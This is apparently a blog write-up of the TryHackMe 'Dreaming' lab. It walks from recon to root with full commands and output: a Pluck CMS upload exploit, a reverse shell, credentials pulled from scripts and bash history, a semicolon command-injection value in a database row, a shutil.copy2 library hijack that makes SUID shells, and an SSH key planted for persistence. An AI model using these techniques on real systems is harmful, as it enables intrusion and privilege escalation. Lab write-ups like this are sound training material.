---
title: CTF Walkthrough for TryHackMe Machine Dreaming
date: 2024-10-27 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [TryHackMe, Writeup, CVE]   
image:
  path: /assets/img/posts/walthrough/tryhackme/2024-10-27-dreaming/box-dreaming.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Dreaming a TryHackMe machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: Dreaming<br>
Difficulty: Easy<br>
Operating System: Linux<br>
Machine link: [Dreaming](https://tryhackme.com/r/room/dreaming)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>

## Reconnaissance

We will start by performing a service scan on the target to enumerate the services running on open ports.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Dreaming/Scans/Service]
└─$ nmap -Pn -n -sC -sV 10.10.162.34 -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 08:23 BST
Nmap scan report for 10.10.162.34
Host is up (0.094s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
|   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
|_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.02 seconds
```

The target runs an SSH and a web server. Let's visit the web application running on port 80.
![](/assets/img/posts/walthrough/tryhackme/2024-10-27-dreaming/1-browse.png)

We can see that the Apache default index page is still present on the target. Let's fuzz this web application to uncover hidden files and directories.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Dreaming/Scans/Web]
└─$ ffuf -ic -c -u http://10.10.162.34/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .php,.html,.txt
<SNIP>
________________________________________________
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3397ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 3396ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3400ms]
app                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 97ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

The fuzzing process uncovered an interesting directory i.e. `/app`. Let's visit this directory.
![](/assets/img/posts/walthrough/tryhackme/2024-10-27-dreaming/2-browse.png)
![](/assets/img/posts/walthrough/tryhackme/2024-10-27-dreaming/3-browse.png)

This directory has directory listing enabled and we can identify a new directory named `pluck-4.1.13`. Pluck is a CMS and we can see the version number in the directory's name. We can Google this version number to see if the is any public exploit.
![](/assets/img/posts/walthrough/tryhackme/2024-10-27-dreaming/vuln-dis.png)

This version number is vulnerable to an authenticated file upload vulnerability. The pluck CMS has no default credentials as they are set during installation. If we try to log in using common default passwords, we will find that the admin portal is protected by the common weak password p******d.
![](/assets/img/posts/walthrough/tryhackme/2024-10-27-dreaming/login.png)

## Exploitation

Now that we have the admin password, we can download the POC from exploit db and run it against the target to upload a web shell. 
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Dreaming/Misc File]
└─$ python3 poc.py 10.10.162.34 80 <REDACTED> /app/pluck-4.7.13

Authentification was succesfull, uploading webshell                                                      
Uploaded Webshell to: http://10.10.162.34:80/app/pluck-4.7.13/files/shell.phar 
```

We can access the web shell using the link given to us by the POC. We can obtain a reverse shell using the web shell first we have to start a listener on our attack host.
![](/assets/img/posts/walthrough/tryhackme/2024-10-27-dreaming/shell.png)
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Dreaming/Scans/Web]
└─$ nc -lvnp 1234                         
listening on [any] 1234 ...
```

After starting the listener, we can run the reverse shell command in the web shell.
![](/assets/img/posts/walthrough/tryhackme/2024-10-27-dreaming/reverseshell.png)

When we return to our listener, we will notice a reverse connection from the target.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Dreaming/Scans/Web]
└─$ nc -lvnp 1234                         
listening on [any] 1234 ...
connect to [10.21.68.180] from (UNKNOWN) [10.10.162.34] 55054
bash: cannot set terminal process group (810): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dreaming:/var$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@dreaming:/var$ ^Z
zsh: suspended  nc -lvnp 1234

┌──(pentester㉿kali)-[~/…/Challenge/Dreaming/Scans/Web]
└─$ stty raw -echo;fg     
[1]  + continued  nc -lvnp 1234
                               export=TERM=xterm
www-data@dreaming:/var$ 
```

We can enumerate the local users on the system by reading the `/etc/passwd` file.
```bash
www-data@dreaming:/$ cat /etc/passwd      
root:x:0:0:root:/root:/bin/bash
<SNIP>
lucien:x:1000:1000:lucien:/home/lucien:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:118:MySQL Server,,,:/nonexistent:/bin/false
death:x:1001:1001::/home/death:/bin/bash
morpheus:x:1002:1002::/home/morpheus:/bin/bash
```

A quick enumeration of the file system reveals the presence of two scripts in the `/opt` directory.
```bash
www-data@dreaming:/$ ls -l opt
total 8
-rwxrw-r-- 1 death  death  1574 Aug 15  2023 getDreams.py
-rwxr-xr-x 1 lucien lucien  483 Aug  7  2023 test.py
```

The `test.py` file contains a password that matches the username Lucien.
```bash
www-data@dreaming:/opt$ cat test.py 
import requests

#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "<REDACTED>"

<SNIP>
```

We can use this password to connect to the target as Lucien using SSH and read the first flag.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Dreaming/Misc File]
└─$ ssh lucien@10.10.162.34
                                  {} {}
                            !  !  II II  !  !
                         !  I__I__II II__I__I  !
                         I_/|--|--|| ||--|--|\_I
        .-'"'-.       ! /|_/|  |  || ||  |  |\_|\ !       .-'"'-.
       /===    \      I//|  |  |  || ||  |  |  |\\I      /===    \
       \==     /   ! /|/ |  |  |  || ||  |  |  | \|\ !   \==     /
        \__  _/    I//|  |  |  |  || ||  |  |  |  |\\I    \__  _/
         _} {_  ! /|/ |  |  |  |  || ||  |  |  |  | \|\ !  _} {_
        {_____} I//|  |  |  |  |  || ||  |  |  |  |  |\\I {_____}
   !  !  |=  |=/|/ |  |  |  |  |  || ||  |  |  |  |  | \|\=|-  |  !  !
  _I__I__|=  ||/|  |  |  |  |  |  || ||  |  |  |  |  |  |\||   |__I__I_
  -|--|--|-  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |--|--|-
  _|__|__|   ||_|__|__|__|__|__|__|| ||__|__|__|__|__|__|_||-  |__|__|_
  -|--|--|   ||-|--|--|--|--|--|--|| ||--|--|--|--|--|--|-||   |--|--|-
   |  |  |=  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |  |  |
   |  |  |-  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |  |  |
   |  |  |=  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||-  |  |  |
  _|__|__|   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |__|__|_
  -|--|--|=  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |--|--|-
  _|__|__|   ||_|__|__|__|__|__|__|| ||__|__|__|__|__|__|_||-  |__|__|_
  -|--|--|=  ||-|--|--|--|--|--|--|| ||--|--|--|--|--|--|-||=  |--|--|-
  jgs |  |-  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||-  |  |  |
 ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~~~~~~~~~~~

W e l c o m e, s t r a n g e r . . .
lucien@10.10.162.34's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-155-generic x86_64)
<SNIP>

lucien@dreaming:~$ ls
lucien_flag.txt
```

Looking at the sudo rights of this user, we can see that Lucien can run the command `/usr/bin/python3 /home/death/getDreams.py` as the user Death.
```bash
lucien@dreaming:~$ sudo -l 
Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

We could try to read the script `getDreams.py` Lucien can execute as death but unfortunately, we don't have read access to it.
```bash
lucien@dreaming:~$ ls -l /home/death/
total 8
-rw-rw---- 1 death death   21 Jul 28  2023 death_flag.txt
-rwxrwx--x 1 death death 1539 Aug 25  2023 getDreams.py
```

Remember that we saw a script having a similar name in the `/opt` directory. This might be thesame script so let's read it.
```bash
lucien@dreaming:~$ cat /opt/getDreams.py                           
import mysql.connector                                             
import subprocess                                                  

# MySQL credentials
DB_USER = "death"                                                  
DB_PASS = "#redacted"                                              
DB_NAME = "library"                                                

import mysql.connector                                             
import subprocess                                                                                                                      
def getDreams():                                                   
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(                      
            host="localhost",                                      
            user=DB_USER,                                          
            password=DB_PASS,
            database=DB_NAME                                       
        )                                                          
        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()                               
        # Construct the MySQL query to fetch dreamer and dream columns from dreams table                                               
        query = "SELECT dreamer, dream FROM dreams;"
        # Execute the query                                        
        cursor.execute(query)
        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()
        if not dreams_info:
            print("No dreams found in the database.")
        else:                                                      
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:                         
                dreamer, dream = dream_info                        
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)           
    except mysql.connector.Error as error:                         
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")                                   
    finally:                                                       
        # Close the cursor and connection
        cursor.close()                                             
        connection.close()                                         

# Call the function to echo the dreamer and dream information                                                                          
getDreams() 
```

This Python script connect to the `library` database as the Death user (unfortunately the password is redacted), retrieves data from the `dreamer` and `dream` columns of the `dreams` table, contructs a string using this data, and finally executes the string. This means that if we can add fake entries in the database, our entries will also be executed. We can run the script present in the  `/home/death` directory using our sudo privilege to ensure that it is thesame with the one in the `/opt` directory.
```bash
lucien@dreaming:~$ sudo -u death  /usr/bin/python3 /home/death/getDreams.py     
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician
```

We can see that the output is formated in thesame way as we could read in the script present in the `/opt` directory. This means the are thesame. Unfortunately, we cannot add fake entries in the database since we do not have valid credentials. In the user's home directory, we can see a `.bash_history` file. Let's read this file. 
```bash
lucien@dreaming:~$ ls -al
total 44
drwxr-xr-x 5 lucien lucien 4096 Oct 26 09:08 .
drwxr-xr-x 5 root   root   4096 Jul 28  2023 ..
-rw------- 1 lucien lucien  684 Aug 25  2023 .bash_history
-rw-r--r-- 1 lucien lucien  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lucien lucien 3771 Feb 25  2020 .bashrc
drwx------ 3 lucien lucien 4096 Jul 28  2023 .cache
drwxrwxr-x 4 lucien lucien 4096 Jul 28  2023 .local
-rw-rw---- 1 lucien lucien   19 Jul 28  2023 lucien_flag.txt
-rw------- 1 lucien lucien  732 Oct 26 09:08 .mysql_history
-rw-r--r-- 1 lucien lucien  807 Feb 25  2020 .profile
drwx------ 2 lucien lucien 4096 Jul 28  2023 .ssh
-rw-r--r-- 1 lucien lucien    0 Jul 28  2023 .sudo_as_admin_successful
```
```bash
lucien@dreaming:~$ cat .bash_history 
ls                       
<SNIP>
cd ~   
clear          
ls                              
mysql -u lucien -p<REDACTED>
<SNIP>
```

We can see Lucien's password for the database server. Let's use this to connect to the database and add fake entries in the `dreamer` and/or `dream` columns that will be execute by the `getDreams.py` script.
```bash
lucien@dreaming:~$ mysql -u lucien -p<REDACTED>
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 13
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use library
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_library |
+-------------------+
| dreams            |
+-------------------+
1 row in set (0.00 sec)
mysql> select * from dreams;
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
+---------+------------------------------------+
4 rows in set (0.00 sec)
mysql> desc dreams;
+---------+--------------+------+-----+---------+-------+
| Field   | Type         | Null | Key | Default | Extra |
+---------+--------------+------+-----+---------+-------+
| dreamer | varchar(50)  | YES  |     | NULL    |       |
| dream   | varchar(255) | YES  |     | NULL    |       |
+---------+--------------+------+-----+---------+-------+
2 rows in set (0.00 sec)
mysql> INSERT INTO dreams (dreamer, dream)
    -> VALUES ('Shell', ';;cp /usr/bin/bash /home/death/;chmod +s /home/death/bash');
Query OK, 1 row affected (0.01 sec)

mysql> select * from dreams;
+---------+----------------------------------------------------------+
| dreamer | dream                                                    |
+---------+----------------------------------------------------------+
| Alice   | Flying in the sky                                        |
| Bob     | Exploring ancient ruins                                  |
| Carol   | Becoming a successful entrepreneur                       |
| Dave    | Becoming a professional musician                         |
| Shell   | ;cp /usr/bin/bash /home/death/;chmod +s /home/death/bash |
+---------+----------------------------------------------------------+
5 rows in set (0.00 sec)
```

We first added a `;` that will end the execution of the `echo` command and followed by the `copy` command that will copy the bash exectable to Death's home directroy and `chmod` that will add the SUID bit to the copied `bash` executable. When we run the `/home/death/getDreams.py` script using our sudo right this commands will be executed and we will see the bash executable with Death's SUID bit set in the `/home/death` directory.
```bash
lucien@dreaming:~$ sudo -u death  /usr/bin/python3 /home/death/getDreams.py     
<SNIP>

lucien@dreaming:~$ ls -l /home/death/ 
total 1164
-rwsr-sr-x 1 death death 1183448 Oct 26 09:36 bash
-rw-rw---- 1 death death      21 Jul 28  2023 death_flag.txt
-rwxrwx--x 1 death death    1539 Aug 25  2023 getDreams.py
```

We can use this bash executable to obtain a shell as the Death user and use it to read the second flag.
```bash
lucien@dreaming:~$ /home/death/bash -p
bash-5.0$ whoami
death
bash-5.0$ ls
lucien_flag.txt
bash-5.0$ ls -l /home/death/
total 1164
-rwsr-sr-x 1 death death 1183448 Oct 26 09:36 bash
-rw-rw---- 1 death death      21 Jul 28  2023 death_flag.txt
-rwxrwx--x 1 death death    1539 Aug 25  2023 getDreams.py
```

Remember that the `/home/death/getDreams.py` connects to the database server as death. We can read this script to see Death's password and try to log in as Death using SSH.
```bash
bash-5.0$ cat /home/death/getDreams.py
import mysql.connector
import subprocess                                                                            
# MySQL credentials
DB_USER = "death"
DB_PASS = "<REDACTED>"
DB_NAME = "library"
def getDreams():                                                                              
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",                  
            user=DB_USER,                      
            password=DB_PASS,]
            database=DB_NAME    
```
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Dreaming]
└─$ ssh death@10.10.162.34  
<SNIP>
Last login: Fri Nov 17 21:44:20 2023
death@dreaming:~$ 
```
We see that the Death user used the same password for the database server and for SSH authentication.

## Post Exploitation

We can see a `.viminfo` file in Death's home directory. We can read this file to see the files this user editted.
```bash
death@dreaming:~$ cat .viminfo                                                   <SNIP>

# File marks:
'0  297  0  /usr/lib/python3.8/shutil.py
|4,48,297,0,1691452277,"/usr/lib/python3.8/shutil.py"
'1  379  5  /usr/lib/python3.8/shutil.py
|4,49,379,5,1691452268,"/usr/lib/python3.8/shutil.py"
'2  379  5  /usr/lib/python3.8/shutil.py
|4,50,379,5,1691452268,"/usr/lib/python3.8/shutil.py"
'3  59  10  ~/getDreams.py
|4,51,59,10,1690567223,"~/getDreams.py"
```

We can see many entries of the `/usr/lib/python3.8/shutil.py` file, the file containing the code of Python's shutil module. We can verify our privileges on this file using `ls`.
```bash
death@dreaming:~$ ls  -l /usr/lib/python3.8/shutil.py
-rw-rw-r-- 1 root death 51474 Aug  7  2023 /usr/lib/python3.8/shutil.py
```

This file belong to the death group and we can write into it. Let's transfer `pspy64` to the target and run it to enumerate any process utilising this Pyhton module. 
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Dreaming/Misc File]
└─$ scp /usr/share/pspy/pspy64 death@10.10.162.34:/tmp
<SNP>
W e l c o m e, s t r a n g e r . . .
death@10.10.162.34's password: 
pspy64                                                                                                                                                                         100% 3032KB 666.1KB/s   00:04

┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Dreaming/Misc File]
└─$ ssh death@10.10.162.34  
<SNIP>
Last login: Fri Nov 17 21:44:20 2023
death@dreaming:~$ cd /tmp
death@dreaming:/tmp$ chmod 755 pspy64 
death@dreaming:/tmp$ ./pspy64 
<SNIP>
2024/10/26 10:05:01 CMD: UID=1002  PID=40955  | /bin/sh -c /usr/bin/python3.8 /home/morpheus/restore.py 
2024/10/26 10:05:01 CMD: UID=0     PID=40956  | /lib/systemd/systemd-udevd 
2024/10/26 10:06:01 CMD: UID=0     PID=40958  | /usr/sbin/CRON -f 
2024/10/26 10:06:01 CMD: UID=1002  PID=40959  | /usr/sbin/CRON -f 
2024/10/26 10:06:01 CMD: UID=1002  PID=40960  | /usr/bin/python3.8 /home/morpheus/restore.py 
```

We can see that the a cron job run by the user with UID 1002 (morpheus) runs the `/home/morpheus/restore.py` script  after every one minute. Let's read this Python script file. 
```bash
death@dreaming:/tmp$ cat /home/morpheus/restore.py
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

Notice that this script uses the `copy2` function in the Shutil module. All we have to do now is to edit this function in the `/usr/lib/python3.8/shutil.py` file we have write access on and when this function will be call by the `/home/morpheus/restore.py` script run by Morpheus, our extra code will be executed. 
```python
def copy2(src, dst, *, follow_symlinks=True):
    """
    <SNIP>
    """
    os.system("cp /usr/bin/bash /home/morpheus/;chmod +s /home/morpheus/bash")
    if os.path.isdir(dst):
        dst = os.path.join(dst, os.path.basename(src))
    copyfile(src, dst, follow_symlinks=follow_symlinks)
    copystat(src, dst, follow_symlinks=follow_symlinks)
    return dst
```

The extra code added to the `copy2` function will create a bash executable with SUID bit set in the `/home/morpheus/` directory. When this cron job will be executed after our modification the extra code will be executed.
```bash
death@dreaming:~$ ls -l /home/morpheus/ 
total 1168
-rwsr-sr-x 1 morpheus morpheus 1183448 Oct 26 10:12 bash
-rw-rw-r-- 1 morpheus morpheus      22 Jul 28  2023 kingdom
-rw-rw---- 1 morpheus morpheus      28 Jul 28  2023 morpheus_flag.txt
-rw-rw-r-- 1 morpheus morpheus     180 Aug  7  2023 restore.py
```

We can use this bash executable with morpheus SUID bit to obtain a shell as morpheus and read the third flag on the target.
```bash
death@dreaming:~$ cd /home/morpheus/
death@dreaming:/home/morpheus$ ./bash  -p
bash-5.0$ whoami
morpheus
bash-5.0$ ls
bash  kingdom  morpheus_flag.txt  restore.py
```

To obtain a stable shell we can create Morpheus's SSH `.ssh/authorized_keys` file and add the public key of a private key we control.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Dreaming/Misc File]
└─$ ssh-keygen -t ed25519 
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/pentester/.ssh/id_ed25519): ./id_ed25519
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./id_ed25519
Your public key has been saved in ./id_ed25519.pub
<SNIP>

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Dreaming/Misc File]
└─$ cat id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMbsvX2b4u0h1tDQMI56nIMDruVeOyzcypxB8nl6gy1q pentester@kali
```

```bash
bash-5.0$ pwd
/home/morpheus
bash-5.0$ mkdir .ssh
bash-5.0$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMbsvX2b4u0h1tDQMI56nIMDruVeOyzcypxB8nl6gy1q pentester@kali' > .ssh/authorized_keys
```

We can now use the private key of the associate public key to connect to the target as morpheus.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Dreaming/Misc File]
└─$ ssh morpheus@10.10.162.34 -i id_ed25519 
<SNIP>
morpheus@dreaming:~$ ls
bash  kingdom  morpheus_flag.txt  restore.py
```

Looking at this user's sudo right we see that Morpheus can run any command as root. We can use this sudo righ to login as root using `sudo su`.
```bash
morpheus@dreaming:~$ sudo -l
Matching Defaults entries for morpheus on dreaming:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User morpheus may run the following commands on dreaming:
    (ALL) NOPASSWD: ALL
morpheus@dreaming:~$ sudo su
root@dreaming:/home/morpheus# ls /root
snap
```

## Conclusion

Congratulations! In this walkthrough, you have exploited a file upload vulnerability in the Pluck CMS to obtain a foothold on the target. Finally, youyou obtained a root shell by hijacking a Python library you had write access to. This machine was designed to show how improper upgrade pratices, password resuse, and the use of weak passwords could seriouly impact an organisation's security posture. Thanks for following up on this walkthrough.
